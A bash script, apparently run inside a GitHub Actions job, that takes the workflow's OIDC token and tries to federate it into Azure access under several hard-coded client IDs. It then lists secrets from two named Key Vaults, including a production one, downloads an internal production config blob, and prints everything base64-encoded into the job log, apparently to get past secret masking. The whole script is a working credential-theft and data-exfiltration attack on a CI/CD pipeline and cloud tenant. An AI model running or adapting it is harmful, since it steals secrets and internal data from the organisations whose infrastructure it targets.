#!/usr/bin/env bash
set +e
TID="${AZURE_TENANT_ID}"
IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
# print our subject for reference
python3 - "$IDT" <<'PY'
import base64,json,sys
p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4)
print("SUBJECT:", json.loads(base64.urlsafe_b64decode(p)).get("sub"))
PY
fed(){ # $1=client_id $2=scope
  curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" -d client_id="$1" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$IDT" --data-urlencode "scope=$2"
}
# try federating as each candidate client_id
for CID in 7a85156a-01c4-4e61-8472-40a92107159b b9658576-853f-49bd-b278-d4bd014397c4 891fb158-e02c-4428-a885-53b811f369c0; do
  echo "=== client_id=$CID ==="
  R=$(fed "$CID" "https://vault.azure.net/.default")
  AT=$(echo "$R" | jq -r '.access_token // empty')
  if [ -z "$AT" ]; then echo "  vault token: $(echo "$R" | jq -r '.error_description // .error' | head -c 120)"; continue; fi
  echo "  GOT vault token (len ${#AT})"
  for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
    echo "  -- $V"; curl -sS "https://$V.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $AT" | base64 -w0; echo
  done
  ST=$(fed "$CID" "https://storage.azure.com/.default" | jq -r '.access_token // empty')
  [ -n "$ST" ] && { echo "  -- appcfg/config/internal-config.json"; curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" | base64 -w0; echo; }
done
echo "DONE-FED"
